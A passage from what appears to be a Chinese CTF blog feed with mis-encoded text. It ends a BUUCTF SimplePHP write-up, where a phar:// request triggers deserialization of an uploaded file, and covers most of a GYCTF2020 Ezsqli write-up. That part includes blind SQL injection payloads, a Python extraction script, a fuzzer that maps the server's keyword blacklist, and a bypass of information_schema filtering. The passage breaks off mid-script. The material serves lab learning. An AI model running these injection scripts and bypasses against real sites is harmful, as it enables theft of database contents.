id="åœ¨file-phpé¡µé¢ä½¿ç”¨phar-åè®®è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„pop-jpg"><a href="#åœ¨file-phpé¡µé¢ä½¿ç”¨phar-åè®®è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„pop-jpg" class="headerlink" title="åœ¨file.phpé¡µé¢ä½¿ç”¨phar:&#x2F;&#x2F;åè®®è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„pop.jpg:"></a>åœ¨file.phpé¡µé¢ä½¿ç”¨phar:&#x2F;&#x2F;åè®®è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„pop.jpg:</h2><p>åœ¨function.phpä¸­å­˜åœ¨ä»¥ä¸‹ä»£ç :</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; <br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬çš„æ–‡ä»¶åä¸º:md5(â€˜pop.jpgâ€™.$_SERVER[â€œREMOTE_ADDRâ€])</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>$_SERVER[â€œREMOTE_ADDRâ€] æ˜¯ä¸€ä¸ª PHP é¢„å®šä¹‰å˜é‡ï¼Œç”¨äºè·å–å½“å‰è¯·æ±‚çš„å®¢æˆ·ç«¯ IP åœ°å€,$_FILES[â€œfileâ€][â€œnameâ€] è·å–çš„æ˜¯æ•´ä¸ªæ–‡ä»¶ååŒ…å«æ–‡ä»¶çš„åç¼€åã€‚</p><p>æ ¹æ®ç½‘é¡µçš„æ˜¾ç¤ºï¼š </p><p><img src="/images/2024-2-3-SimplePHP/image-20240131201918489.png" alt="image-20240131201918489"></p><p><img src="/images/2024-2-3-SimplePHP/image-20240131201529895.png" alt="image-20240131201529895"></p><p>ä»¥åŠbase.phpä¸­çš„ä»£ç å®¡è®¡:<br><img src="/images/2024-2-3-SimplePHP/image-20240131182903755.png" alt="image-20240131182903755"></p><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“æˆ‘ä»¬çš„å®¢æˆ·ç«¯ipåœ°å€ä¸º10.244.80.21(ipv4åªæœ‰4éƒ¨åˆ†)</p><h3 id="æ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åä¸º"><a href="#æ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åä¸º" class="headerlink" title="æ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åä¸º:"></a>æ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åä¸º:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;pop.jpg&#x27;</span>.<span class="hljs-string">&#x27;10.244.80.21&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="è¾“å‡º-2"><a href="#è¾“å‡º-2" class="headerlink" title="è¾“å‡º:"></a>è¾“å‡º:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">2f65792e232f3de9f28be6a4566226b4<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨phar-åè®®è®¿é—®æˆ‘ä»¬çš„ä¸Šä¼ æ–‡ä»¶"><a href="#ä½¿ç”¨phar-åè®®è®¿é—®æˆ‘ä»¬çš„ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨phar:&#x2F;&#x2F;åè®®è®¿é—®æˆ‘ä»¬çš„ä¸Šä¼ æ–‡ä»¶:"></a>ä½¿ç”¨phar:&#x2F;&#x2F;åè®®è®¿é—®æˆ‘ä»¬çš„ä¸Šä¼ æ–‡ä»¶:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://abee5700-2f2c-4100-9748-3631d96928c3.node5.buuoj.cn:81/file.php?file=phar://upload/2f65792e232f3de9f28be6a4566226b4.jpg<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-SimplePHP/image-20240131201331781.png" alt="image-20240131201331781"></p><h3 id="å¯¹å¯†æ–‡è¿›è¡Œè§£ç å¾—"><a href="#å¯¹å¯†æ–‡è¿›è¡Œè§£ç å¾—" class="headerlink" title="å¯¹å¯†æ–‡è¿›è¡Œè§£ç å¾—:"></a>å¯¹å¯†æ–‡è¿›è¡Œè§£ç å¾—:</h3><p><img src="/images/2024-2-3-SimplePHP/image-20240131201141153.png" alt="image-20240131201141153"></p><p>flag&#x3D;flag{56a68951-e267-4621-86e8-2418e3005173}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF [GYCTF2020]Ezsqli</title>
    <link href="/2024/02/03/2024-2-3-Ezsqli/"/>
    <url>/2024/02/03/2024-2-3-Ezsqli/</url>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h2><p>[<a href="https://blog.csdn.net/fmyyy1/article/details/115447291">GYCTF2020]Ezsqli_[gyctf2020]ezsqli 1-CSDNåšå®¢</a></p><p><img src="/images/2024-2-3-Ezsqli/image-20240130205201490.png" alt="image-20240130205201490"></p><p><img src="/images/2024-2-3-Ezsqli/image-20240130205347942.png" alt="image-20240130205347942"></p><p>æ³¨å…¥ç‚¹ä¸ºPOSTè¯·æ±‚è·å–çš„idå‚æ•°</p><p>æµ‹è¯•æ³¨å…¥ç‚¹ä¹‹åï¼Œå‘ç°ä¸è¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œæ‰€ä»¥åªèƒ½é‡‡ç”¨ç›²æ³¨çš„æ–¹å¼</p><h2 id="æµ‹è¯•ç›²æ³¨payload"><a href="#æµ‹è¯•ç›²æ³¨payload" class="headerlink" title="æµ‹è¯•ç›²æ³¨payload:"></a>æµ‹è¯•ç›²æ³¨payload:</h2><p>payload1:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>id=0<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130205442224.png" alt="image-20240130205442224"></p><p>payload2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>id=1<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130205526519.png" alt="image-20240130205526519"></p><p>äº§ç”Ÿä¸¤ç§ä¸åŒçš„å›æ˜¾ç»“æœï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨æ™®é€šç›²æ³¨</p><h2 id="æ„é€ æ™®é€šç›²æ³¨payload"><a href="#æ„é€ æ™®é€šç›²æ³¨payload" class="headerlink" title="æ„é€ æ™®é€šç›²æ³¨payload:"></a>æ„é€ æ™®é€šç›²æ³¨payload:</h2><p>payload1:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>id=1^(ascii(substr(database(),1,1))&gt;32)<br></code></pre></td></tr></table></figure><p>æµ‹è¯•payload1æ˜¯å¦å¯è¡Œ:</p><p><img src="/images/2024-2-3-Ezsqli/image-20240130210119907.png" alt="image-20240130210119907"></p><p>payload2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>id=1^(ascii(substr(database(),1,1))&lt;32)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130210149711.png" alt="image-20240130210149711"></p><p>è¿”å›ä¸¤ç§ä¸åŒçš„ç»“æœï¼Œæ‰€ä»¥æˆ‘ä»¬çš„payloadå¯è¡Œ</p><h2 id="çˆ†æ•°æ®åº“å"><a href="#çˆ†æ•°æ®åº“å" class="headerlink" title="çˆ†æ•°æ®åº“å:"></a>çˆ†æ•°æ®åº“å:</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://aca6d848-9ae8-4a23-8abd-cfbb6e52885c.node5.buuoj.cn:81/index.php&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># å¯¹æ•°æ®åº“åå­—ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œæš´åŠ›å‰–è§£</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># æ‰‹åŠ¨è§„å®šæ•°æ®åº“åå­—é•¿åº¦</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>        <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>        <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr(database()%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(n, tmp)</span><br>        <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(n, tmp)</span><br>        payload = <span class="hljs-string">&quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>        data = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: payload<br>        &#125;<br>        <span class="hljs-comment"># print(begin,end,tmp)</span><br>        <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>        <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>        <span class="hljs-comment"># print(url + payload2)</span><br>        <span class="hljs-comment"># r = requests.get(url + payload2, )</span><br>        r = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>        true_text = <span class="hljs-string">&quot;Occured&quot;</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>    <span class="hljs-comment"># print(tmp)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥æ•°æ®åº“çš„ç¬¬%dä¸ªå­—ç¬¦:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># å¯¹ä¸‹ä¸€ä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥æ•°æ®åº“çš„åå­—ä¸ºï¼š&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130210805684.png" alt="image-20240130210805684"></p><p>çˆ†å‡ºæ•°æ®åº“åä¸ºgive_grandpa_pa_pa_pa</p><h2 id="çˆ†æ•°æ®åº“çš„è¡¨å"><a href="#çˆ†æ•°æ®åº“çš„è¡¨å" class="headerlink" title="çˆ†æ•°æ®åº“çš„è¡¨å:"></a>çˆ†æ•°æ®åº“çš„è¡¨å:</h2><p>åœ¨ä½¿ç”¨è„šæœ¬æ—¶å‘ç°å‡ºé”™ï¼Œé€šè¿‡æµ‹è¯•payloadå‘ç°å­˜åœ¨å¯¹sqlè¯­å¥çš„è¿‡æ»¤:</p><p><img src="/images/2024-2-3-Ezsqli/image-20240130211251516.png" alt="image-20240130211251516"></p><p>æ‰€ä»¥è¦å…ˆæµ‹è¯•ç½‘é¡µå¯¹sqlè¯­å¥æœ‰å“ªäº›è¿‡æ»¤:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># æ‰“å¼€è¯»å–SQL_fuzzæ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># åˆ é™¤è¯»å–æ•°æ®ä¸­çš„&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # å­—ç¬¦ä¸²æ ¹æ®ç©ºæ ¼è¿›è¡Œåˆ†å‰²</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br>black_list=[]<br><br><span class="hljs-comment"># è¿›è¡Œfuzzæ³¨å…¥</span><br>url = <span class="hljs-string">&quot;http://aca6d848-9ae8-4a23-8abd-cfbb6e52885c.node5.buuoj.cn:81/index.php&quot;</span><br><span class="hljs-comment"># GETè¯·æ±‚</span><br><span class="hljs-comment"># for data in data_list:</span><br><span class="hljs-comment">#     da = data</span><br><span class="hljs-comment">#     # da = &quot;1 &#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     # da = &quot;1&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     da = &quot;1/**/&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     r = requests.get(url+da)</span><br><span class="hljs-comment">#     # ä½¿ç”¨timeä½¿è¯·æ±‚èƒ½å¤Ÿæ‹¥æœ‰è¶³å¤Ÿçš„æ—¶é—´å»å“åº”</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     # è·å–è¿‡æ»¤ç½‘ç«™å“åº”ä¿¡æ¯</span><br><span class="hljs-comment">#     reponse_txt = &quot;ä½ è¿˜æƒ³æ‰§è¡Œ&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         black_list.append(data)</span><br><span class="hljs-comment">#         print(&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;.format(data))</span><br><br><span class="hljs-comment"># POSTè¯·æ±‚</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data_list:<br>    <span class="hljs-comment"># da = d</span><br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(d)</span><br>    da = <span class="hljs-string">&quot;1&#x27;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d)<br>    <span class="hljs-comment"># POSTä¼ è¾“jsonæ•°æ®</span><br>    payload = &#123;<br>        <span class="hljs-string">&quot;id&quot;</span>:da<br>    &#125;<br>    r = requests.post(url=url, data=payload)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    reponse_txt = <span class="hljs-string">&quot;Injection&quot;</span><br>    <span class="hljs-comment"># print(r.text)</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        black_list.append(d)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d))<br><br><br><span class="hljs-built_in">print</span>(black_list)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">[&#x27;handler&#x27;, &#x27;sleep&#x27;, &#x27;SLEEp&#x27;, &#x27;delete&#x27;, &#x27;having&#x27;, &#x27;or&#x27;, &#x27;oroR&#x27;, &#x27;Or&#x27;, &#x27;oR&#x27;, &#x27;OR&#x27;, &#x27;BENCHMARK&#x27;, &#x27;limit&#x27;, &#x27;limitLimIt&#x27;, &#x27;LImit&#x27;, &#x27;LimIt&#x27;, &#x27;insert&#x27;, &#x27;insERT&#x27;, &#x27;INSERT&#x27;, &#x27;INFORMATION&#x27;, &#x27;xor&#x27;, &#x27;ANDANd&#x27;, &#x27;And&#x27;, &#x27;and&#x27;, &#x27;aNd&#x27;, &#x27;BY&#x27;, &#x27;By&#x27;, &#x27;case&#x27;, &quot;admin&#x27;&quot;, &#x27;union&#x27;, &#x27;UNIon&#x27;, &#x27;UNION&#x27;, &#x27;oorr&#x27;, &#x27;anandd&#x27;, &#x27;HAVING&#x27;, &#x27;IF&#x27;, &#x27;INTO&#x27;, &#x27;JOIN&#x27;, &#x27;sleep&#x27;, &#x27;infromation_schema&#x27;, &#x27;OR&#x27;, &#x27;ORDER&#x27;, &#x27;ORD&#x27;, &#x27;UNION&#x27;, &#x27;UPDATE&#x27;, &#x27;USING&#x27;, &#x27;AND&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;inset&#x27;, &#x27;DELETE&#x27;, &#x27;floor&#x27;, &#x27;rand()&#x27;, &#x27;information_schema.tables&#x27;, &#x27;LIMIT&#x27;, &#x27;ORD&#x27;, &#x27;order &#x27;, &#x27;by&#x27;, &#x27;ORDER&#x27;, &#x27;OUTFILE&#x27;, &#x27;updatexml&#x27;, &#x27;instr&#x27;, &#x27;benchmark&#x27;, &#x27;format&#x27;, &#x27;bin&#x27;, &#x27;substring&#x27;, &#x27;ord&#x27;, &#x27;UPDATE&#x27;, &#x27;for&#x27;, &#x27;BEFORE&#x27;, &#x27;in&#x27;, &#x27;SEPARATOR&#x27;, &#x27;XOR&#x27;, &#x27;CURSOR&#x27;, &#x27;FLOOR&#x27;, &#x27;INFILE&#x27;]<br></code></pre></td></tr></table></figure><h3 id="æµ‹è¯•æˆ‘ä»¬çš„sqlè¯­å¥æœ‰å“ªäº›é»‘åå•å­—ç¬¦"><a href="#æµ‹è¯•æˆ‘ä»¬çš„sqlè¯­å¥æœ‰å“ªäº›é»‘åå•å­—ç¬¦" class="headerlink" title="æµ‹è¯•æˆ‘ä»¬çš„sqlè¯­å¥æœ‰å“ªäº›é»‘åå•å­—ç¬¦:"></a>æµ‹è¯•æˆ‘ä»¬çš„sqlè¯­å¥æœ‰å“ªäº›é»‘åå•å­—ç¬¦:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">id=1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),1,1))&gt;79)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130212644911.png" alt="image-20240130212644911"></p><p>ç”±äºæˆ‘ä»¬çš„é»‘åå•æ•°æ®ä¸­å­˜åœ¨å¯¹å¤§å°å†™çš„è¿‡æ»¤ï¼Œæ‰€ä»¥éœ€è¦è€ƒè™‘å…¶ä»–çš„ç»•è¿‡æ–¹å¼ï¼Œåˆå› ä¸ºè¿™é‡Œçš„é»‘åå•æ•°æ®éƒ½æ˜¯åªå­˜åœ¨äºinformation_schema.tablesä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†å…¶æ›¿ä»£å°±å¯ä»¥ç»•è¿‡</p><h3 id="InnoDbå¼•æ“ï¼ˆinformation-schema-tablesçš„ä»£æ›¿ï¼‰ï¼š"><a href="#InnoDbå¼•æ“ï¼ˆinformation-schema-tablesçš„ä»£æ›¿ï¼‰ï¼š" class="headerlink" title="InnoDbå¼•æ“ï¼ˆinformation_schema.tablesçš„ä»£æ›¿ï¼‰ï¼š"></a>InnoDbå¼•æ“ï¼ˆinformation_schema.tablesçš„ä»£æ›¿ï¼‰ï¼š</h3><p>ä»MYSQL5.5.8å¼€å§‹ï¼ŒInnoDBæˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚è€Œåœ¨MYSQL5.6ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œinndbå¢åŠ äº†innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚</p><h4 id="sysæ•°æ®åº“"><a href="#sysæ•°æ®åº“" class="headerlink" title="sysæ•°æ®åº“:"></a>sysæ•°æ®åº“:</h4><p>åœ¨5.7ä»¥ä¸Šçš„MYSQLä¸­ï¼Œæ–°å¢äº†sysæ•°æ®åº“ï¼Œè¯¥åº“çš„åŸºç¡€æ•°æ®æ¥è‡ªinformation_schemaå’Œperformance_chemaï¼Œå…¶æœ¬èº«ä¸å­˜å‚¨æ•°æ®ã€‚å¯ä»¥é€šè¿‡å…¶ä¸­çš„schema_auto_increment_columnsæ¥è·å–è¡¨åã€‚</p><h3 id="æ„é€ æ–°çš„payloadè·å–è¡¨å"><a href="#æ„é€ æ–°çš„payloadè·å–è¡¨å" class="headerlink" title="æ„é€ æ–°çš„payloadè·å–è¡¨å:"></a>æ„é€ æ–°çš„payloadè·å–è¡¨å:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">id=1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(sys.schema_table_statistics_with_buffer)where(TABLE_SCHEMA=database())),1,1))&gt;79)<br></code></pre></td></tr></table></figure><p>æµ‹è¯•payload:</p><p><img src="/images/2024-2-3-Ezsqli/image-20240130221448487.png" alt="image-20240130221448487"></p><p>æˆåŠŸç»•è¿‡ï¼ï¼ï¼</p><h3 id="çˆ†è¡¨åè„šæœ¬"><a href="#çˆ†è¡¨åè„šæœ¬" class="headerlink" title="çˆ†è¡¨åè„šæœ¬:"></a>çˆ†è¡¨åè„šæœ¬:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://aca6d848-9ae8-4a23-8abd-cfbb6e52885c.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># table_lenå­˜å‚¨æ¯å¼ è¡¨çš„é•¿åº¦</span><br>table_len = [<span class="hljs-number">80</span>]<br><span class="hljs-comment"># table_nameå­˜å‚¨æ¯å¼ 